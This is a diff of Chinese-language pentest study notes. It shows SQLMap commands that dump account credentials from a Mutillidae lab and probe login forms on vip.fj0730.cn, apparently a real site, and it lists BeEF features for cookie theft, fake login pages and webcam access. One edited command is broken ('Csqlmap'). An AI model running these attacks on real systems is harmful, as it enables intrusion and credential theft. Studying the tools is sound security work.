@@ -952,7 +952,7 @@ SQLMap 是个命令行工具，包含在 Kali 中，可以帮我们自动化检�
 
 **指定库名表名下载出指定字段内容**
 
-`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts -C username password mysignature`
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts -C username password mysignature -dump`
 
 ### POST注入
 
@@ -960,7 +960,7 @@ SQLMap 是个命令行工具，包含在 Kali 中，可以帮我们自动化检�
 
 **判断是否有post注入**
 
-`sqlmap -u http://vip.fj0730.cn/login.asp --forms`
+`Csqlmap -u http://vip.fj0730.cn/login.asp --forms`
 
 **查找数据库**
 
@@ -983,6 +983,7 @@ SQLMap 是个命令行工具，包含在 Kali 中，可以帮我们自动化检�
 #### 指定表单注入
 
 `sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb"`
+
 `sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb" --current-db`
 
 
@@ -1139,11 +1140,24 @@ ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公�
 
    + `commands | Browser | Hooked Domain | Get Cookie`获取cookie
 + `social engineering | pretty theft` 社会工程工具，允许攻击者模拟Facebook、YouTube等应用登录页面，诱使受害者输入用户名/密码。
+  
    + 打开摄像头
+   
 + 提取浏览器中存储的用户名/口令
    + 将受害者浏览器作为代理
 
    
+## 7.4 利用SQL盲注
+
+书中介绍了利用burp | intruder 开展SQL盲注，较为繁琐，不如直接使用sqlmap。
+
+## 7.5   使用SQLMAP获得数据库信息
+
+
+
+## 7.6    执行CSRF攻击
+
+
 
    
 
@@ -1164,11 +1178,13 @@ ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公�
    
 
    
+
    
+
    
+
    
-   
-   
+
    
 
 
